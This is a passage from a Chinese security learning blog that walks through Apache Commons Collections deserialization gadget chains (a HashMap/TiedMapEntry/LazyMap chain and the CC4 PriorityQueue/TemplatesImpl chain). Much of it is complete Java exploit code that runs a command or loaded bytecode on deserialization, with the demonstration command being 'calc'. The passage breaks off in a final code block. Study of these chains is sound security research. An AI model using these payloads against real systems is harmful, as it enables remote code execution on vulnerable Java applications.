HashMap.hash()<br>后续利用链.hashCode()<br></code></pre></td></tr></table></figure><p>因此我们可以调用<code>hashCode</code>就会间接调用了<code>getVaule()</code>方法。</p><p>而<code>hashCode</code>又会被<code>put</code>方法调用。</p><p>因此我们想让这个链路串联起来，就只要调用恶意类的put方法。查看<code>HashMap</code>的put方法。</p><p><img src="/../../../blog_image/image-20240330155719384-1716862542443-268.png" alt="image-20240330155719384"></p><p>会将形参<code>key</code>调用<code>hash</code>函数，而<code>hash</code>函数又会根据调用当前key的<code>hashCode</code>方法：</p><p><img src="/../../../blog_image/image-20240330155826276-1716862542443-272.png" alt="image-20240330155826276"></p><p>因此我们创建一个hashmap，key传入的是恶意类的map。传入后会调用这个恶意类的<code>hash</code>—&gt;<code>hashCode</code>—&gt;<code>getVaule</code></p><p>exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">// 创建一个runtime示例 ==》 调用Runtime.getRuntime()</span><br>    Transformer[] transformers = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br><br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, factory);<br><br>    <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>    HashMap&lt;Object, Object&gt; expHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    expHashMap.put(tiedMapEntry,<span class="hljs-string">&quot;sdfdsf&quot;</span>);<br>    SerializeUtil.serialize(expHashMap);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里也可以看到：</p><p>我们调用了put方法之后会调用这个key的hash方法，hash方法会调用它对应的hashcode方法，之后hashcode会调用<code>getValue()</code>方法：</p><p><code>hash</code>方法调用key的<code>hashCode()</code>方法：</p><p><img src="/../../../blog_image/image-20240327115209990-1716862542443-273.png" alt="image-20240327115209990"></p><p><code>hashCode</code>方法调用<code>getVaule()</code>方法：</p><p><img src="/../../../blog_image/image-20240327115253165-1716862542443-271.png" alt="image-20240327115253165"></p><p>这样这条链就走到了我们的<code>getVaule()</code>方法，然后就会执行对应的exp。</p><p>虽然可以执行命令，但是序列化前执行了，而且是在<code>TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;key&quot;);</code>已经执行了命令。</p><p>原因在于：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Object, Object&gt; expHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>expHashMap.put(tiedMapEntry, <span class="hljs-string">&quot;sdfdsf&quot;</span>);<br></code></pre></td></tr></table></figure><p>这个expHashMap的put方法–&gt;hash–&gt;hashCode–&gt;getValue()，最终会调用getValue()方法，最终会走到tiedMapEntry的getVaule方法，这里已经执行完了完整的链路。</p><p>要让这条链路不执行就需要将这个<code>LazyMap</code>的<code>factory</code>静态成员变量设置为其他值。</p><p>由于这个<code>factory</code>字段是受保护的，因此我们需要使用反射去修改该字段的值。</p><p><img src="/../../../blog_image/image-20240330161026577-1716862542443-274.png" alt="image-20240330161026577"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 创建一个runtime示例 ==》 调用Runtime.getRuntime()</span><br>    Transformer[] transformers = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br><br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;hello&quot;</span>));<br><br>    <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>    HashMap&lt;Object, Object&gt; expHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    expHashMap.put(tiedMapEntry, <span class="hljs-string">&quot;sdfdsf&quot;</span>);<br><br>    Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>    factoryField.set(lazyMap,factory);<br><br>    SerializeUtil.serialize(expHashMap);<br>&#125;<br></code></pre></td></tr></table></figure><p>执行反序列化的时候，就不会执行调用了，这是为什么呢？</p><p>最主要的是还是<code>TiedMapEntry</code>中的<code>getValue</code>方法。正常流程是会调用我们的<code>LazyMap</code>的get方法。还记得上面的流程不：</p><p><img src="/../../../blog_image/image-20240327230635345-1716862542443-275.png" alt="image-20240327230635345"></p><p>上面我们调用的时候由于lazymao是为空的，因此调用<code>factory.transform</code>方法。</p><p>而这里反序列化是从文件中读取我们序列化时的数据，因此我们序列化前就已经存在该key了。所以不会调用<code>factory.transform</code>方法了，而是直接调用<code>map.get</code>方法。</p><p>因此思路有了，在put进去之后将我们的key删除，这样反序列化的时候就不存在该key，就会调用<code>factory.transform(key)</code>方法。</p><p>注意这里的map是传入的hashmap。</p><h1 id="完整poc："><a href="#完整poc：" class="headerlink" title="完整poc："></a>完整poc：</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 创建一个runtime示例 ==》 调用Runtime.getRuntime()</span><br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;hello&quot;</span>));<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; expHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">// put方法会执行getValue方法</span><br>        expHashMap.put(tiedMapEntry, <span class="hljs-string">&quot;sdfdsf&quot;</span>);<br><br>        <span class="hljs-comment">// 删除key 目的为了反序列化的时候走factory.transform(key);</span><br>        map.remove(<span class="hljs-string">&quot;key&quot;</span>);<br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,factory);<br><br><span class="hljs-comment">//        SerializeUtil.serialize(expHashMap);</span><br>        SerializeUtil.unSerialize();<br>    &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cc4调用链</title>
    <link href="/2024/05/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/cc%E9%93%BE/cc4%E8%B0%83%E7%94%A8%E9%93%BE/"/>
    <url>/2024/05/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/cc%E9%93%BE/cc4%E8%B0%83%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h1><ul><li>Commons-Collections 4.0</li><li>jdk8u65</li></ul><p>maven中导入坐标：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="CC4调用链分析："><a href="#CC4调用链分析：" class="headerlink" title="CC4调用链分析："></a>CC4调用链分析：</h1><p>cc4这条依赖了<code>commons-collections4</code>而不再是以前的3.2.1版本：</p><p>查找<code>transform</code>方法，查找到了一个类的<code>compare</code>方法，调用了<code>transform</code>方法。</p><p><img src="/../../../blog_image/image-20240331142148733-1716862488653-251.png" alt="image-20240331142148733"></p><p>该类<code>TransformingComparator</code>是可以序列化的，并且这个<code>compare</code>方法在很多地方都会用到：</p><p><img src="E:\blog\source\blog_image\image-20240331142318693-1716862488653-252.png" alt="image-20240331142318693"></p><p>我们在网上查询谁调用了这个<code>compare</code>方法，由于调用该方法的类很多，最终找到了一个原生的java类<code>PriorityQueue</code>优先队列，并且该类是可以实现序列化的。</p><p><code>readObejct</code>方法中调用<code>heapify</code>方法—&gt;<code>siftDown</code>—&gt;<code>siftDownUsingComparator</code>—&gt;<code>compare</code>方法。</p><p><img src="E:\blog\source\blog_image\image-20240331142813630-1716862488653-249.png" alt="image-20240331142813630"></p><p>调试看哪里没有运行成功：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    Transformer[] transformers = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>            <span class="hljs-comment">// 然后调用它的newTransformer()方法</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;)<br>    &#125;;<br><br>    ChainedTransformer&lt;Object&gt; chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br>    <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);<br><br>    <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>    SerializeUtil.serialize(priorityQueue);<br>    SerializeUtil.unSerialize();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(templates, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>点击<code>heapify</code>方法，该方法是对size进行运算，可以看成是<code>/2</code>。</p><p><img src="E:\blog\source\blog_image\image-20240331144452238-1716862488653-250.png" alt="image-20240331144452238"></p><p>size默认值为0：</p><p><img src="E:\blog\source\blog_image\image-20240331144558334-1716862488653-254.png" alt="image-20240331144558334"></p><p>因此我们要让他走进<code>siftDown</code>，就是要让i的结果大于0才可以，那么可以推断出size的值需要<code>&gt;=2</code>，可以直接使用反射修改字段值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    Transformer[] transformers = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>            <span class="hljs-comment">// 然后调用它的newTransformer()方法</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;)<br>    &#125;;<br><br>    ChainedTransformer&lt;Object&gt; chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br>    <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);<br><br>    <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PriorityQueue</span>&gt; priorityQueueClass = priorityQueue.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">sizeFiled</span> <span class="hljs-operator">=</span> priorityQueueClass.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    sizeFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    sizeFiled.set(priorityQueue,<span class="hljs-number">2</span>);<br><br>    SerializeUtil.serialize(priorityQueue);<br>    SerializeUtil.unSerialize();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(templates, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>看别的师傅是调用<code>add</code>对size进行赋值，并且不算调用<code>TemplatesImpl</code>的<code>newTransformer</code>方法，而调用外部的<code>TrAXFilter</code>的构造方法，间接去调用这个<code>newTransformer</code>方法，应该这才是正确的调用链。如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>        instantiateTransformer<br>&#125;;<br>ChainedTransformer&lt;Object&gt; chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);<br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>priorityQueue.add(<span class="hljs-number">1</span>);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>还没序列化的时候就已经弹出计算器了，这是为什么呢？这是因为<code>add</code>会调用<code>siftUpUsingComparator</code>方法，而这个方法内部会调用<code>comparator.compare</code>方法。</p><p><img src="E:\blog\source\blog_image\image-20240331151046191-1716862488653-253.png" alt="image-20240331151046191"></p><p>这和前面cc3的逻辑一样，我们要在调用这个<code>comparator.compare</code>不走我们的调用链。因此在序列化之前不进行赋值。即传入一个没有的<code>transformers</code>，add之后在修改回去。</p><p>完整exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 